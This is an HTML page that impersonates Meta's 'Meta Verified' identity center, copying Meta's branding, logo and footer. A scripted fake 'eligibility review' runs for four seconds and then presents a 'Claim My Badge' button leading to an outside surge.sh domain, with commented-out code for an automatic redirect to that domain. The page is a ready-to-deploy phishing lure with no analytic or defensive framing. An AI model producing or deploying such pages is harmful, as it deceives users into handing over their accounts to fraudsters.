<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Meta Verified | Identity Center</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #f0f2f5; /* Meta light background */
      font-family: "SF Pro Display", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background: #ffffff;
      width: 90%;
      max-width: 400px;
      padding: 40px;
      border-radius: 12px;
      box-shadow: 0 12px 28px 0 rgba(0, 0, 0, 0.1), 0 2px 4px 0 rgba(0, 0, 0, 0.1);
      text-align: center;
    }
    /* Meta Logo Style */
    .meta-logo {
      width: 80px;
      margin-bottom: 20px;
    }
    /* Verified Badge Animation */
    .badge-container {
      position: relative;
      display: inline-block;
      margin-bottom: 20px;
    }
    .verified-badge {
      display: none;
      width: 60px;
      height: 60px;
      background-color: #0064E0;
      border-radius: 50%;
      color: white;
      font-size: 30px;
      line-height: 60px;
      text-align: center;
      box-shadow: 0 4px 10px rgba(0, 100, 224, 0.3);
    }
    /* Official Meta Loader */
    .loader {
      border: 3px solid #f3f3f3;
      border-top: 3px solid #0064E0;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      margin: 0 auto 20px;
    }
    h1 {
      font-size: 24px;
      color: #1c1e21;
      margin-bottom: 8px;
      font-weight: 700;
      letter-spacing: -0.5px;
    }
    p {
      color: #65676b;
      font-size: 15px;
      line-height: 1.4;
      margin-bottom: 30px;
    }
    .btn {
      display: none;
      background-color: #0064E0;
      color: white !important;
      text-decoration: none;
      padding: 12px 0;
      width: 100%;
      border-radius: 8px;
      font-weight: 600;
      font-size: 16px;
      transition: background 0.2s;
      border: none;
      display: block;
      margin-top: 10px;
      opacity: 0; /* Hidden initially */
    }
    .btn:hover {
      background-color: #0056b3;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .meta-footer {
      margin-top: 20px;
      font-size: 12px;
      color: #8a8d91;
    }
  </style>
</head>
<body>

  <div class="container">
    <svg class="meta-logo" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M437 192c-31.7 0-46.3 18.5-46.3 18.5s-14.6-18.5-46.3-18.5c-42.3 0-66.4 33-66.4 74.4 0 52.8 34.2 87.6 84.4 87.6 28.3 0 46.3-18.5 46.3-18.5s18 18.5 46.3 18.5c50.2 0 84.4-34.8 84.4-87.6 0-41.4-24.1-74.4-66.4-74.4z" fill="#0064E0"/></svg>

    <div id="loader" class="loader"></div>
    <div id="success" class="verified-badge">✓</div>
    
    <h1 id="title">Requesting Verified Badge</h1>
    <p id="message">We are reviewing your account eligibility for the Meta Verified subscription program.</p>
    
    <a href="https://get-appeal-for-verified.surge.sh/" id="actionBtn" class="btn" style="display:none;">Claim My Badge</a>
    
    <div class="meta-footer">Meta © 2026</div>
  </div>

  <script>
    // 4 seconds simulation for "Reviewing"
    setTimeout(() => {
      document.getElementById('loader').style.display = 'none';
      document.getElementById('success').style.display = 'inline-block';
      
      document.getElementById('title').innerText = "Eligibility Confirmed";
      document.getElementById('message').innerText = "Congratulations! Your account is eligible for a verified badge. Click below to activate it.";
      
      const btn = document.getElementById('actionBtn');
      btn.style.display = 'block';
      setTimeout(() => { btn.style.opacity = '1'; }, 50);

      // Optional: Auto redirect after 2 seconds if you want
      /*
      setTimeout(() => {
        window.location.href = "https://get-appeal-for-verified.surge.sh/"; 
      }, 2000);
      */

    }, 4000);
  </script>

</body>
</html>
